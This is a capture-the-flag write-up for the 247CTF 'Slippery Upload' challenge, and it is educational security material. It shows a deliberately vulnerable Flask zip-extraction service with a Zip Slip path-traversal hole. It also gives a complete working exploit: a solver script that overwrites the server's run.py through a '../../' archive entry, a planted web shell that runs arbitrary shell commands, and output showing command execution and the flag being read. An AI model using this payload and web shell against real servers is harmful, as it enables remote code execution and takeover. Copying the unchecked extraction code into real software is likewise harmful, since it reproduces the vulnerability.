# SLIPPERY UPLOAD [MODERATE]

## Description

> Can you abuse the zip upload and extraction service to gain code execution on the server?

## Source Code

<details><summary>Click here for /app/run.py in text format</summary>

```python
from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return '<pre>%s</pre>' % open('/app/run.py').read()

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())


@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()
```

</details>

## Short Solution Description / Tags

Zip Slip, RCE

## Solution

By Zip Slip, overwrite the source code to add an endpoint for a web shell, and get the flag.

Append the following to run.py:

```python
@app.route("/webshell")
def webshell():
    try:
        from flask import request
        import subprocess

        ret = subprocess.run(
            request.args.get("cmd", "id"),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        return ret.stdout.decode()

        # import sys
        # return sys.version  # 3.6.9 (default, Oct 17 2019, 11:17:29) [GCC 6.4.0]
    except:
        import traceback

        return traceback.format_exc()
```

solver.py

```python
from zipfile import ZipFile
import io
import requests
import sys

requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "https://d18d4af074e00c78.247ctf.com"


def main():
    # upload zip
    if len(sys.argv) != 2:
        zip_buffer = io.BytesIO()
        with ZipFile(zip_buffer, "w") as zip:
            zip.writestr("../../app/run.py", open("run.py").read())

        r = s.post(
            f"{BASE_URL}/zip_upload",
            files={
                "zarchive": (
                    "tmp.zip",
                    zip_buffer.getvalue(),
                    "application/octet-stream",
                )
            },
        )
        print(r.text)

    # Command Execution
    else:
        cmd = sys.argv[1]
        r = s.get(f"{BASE_URL}/webshell", params={"cmd": cmd})
        print(r.text)


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py  # upload zipfile
Zip archive uploaded and extracted!

$ python3 solver.py 'id'  # command execution
uid=100(nginx) gid=101(nginx) groups=82(www-data),101(nginx),101(nginx)

$ python3 solver.py 'ls'
flag_33cd0604f65815a9375e2da04e1b8610.txt
run.py

$ python3 solver.py 'cat flag_33cd0604f65815a9375e2da04e1b8610.txt'
247CTF{[REDACTED]}
```

## References

- [Zip Slip Vulnerability \| Snyk](https://security.snyk.io/research/zip-slip-vulnerability)
- [zipslip/zipslip.py at main · Ch0pin/zipslip](https://github.com/Ch0pin/zipslip/blob/main/zipslip.py)
- [zipfile — Work with ZIP archives — Python 3.12.1 documentation](https://docs.python.org/3/library/zipfile.html#zipfile-objects)
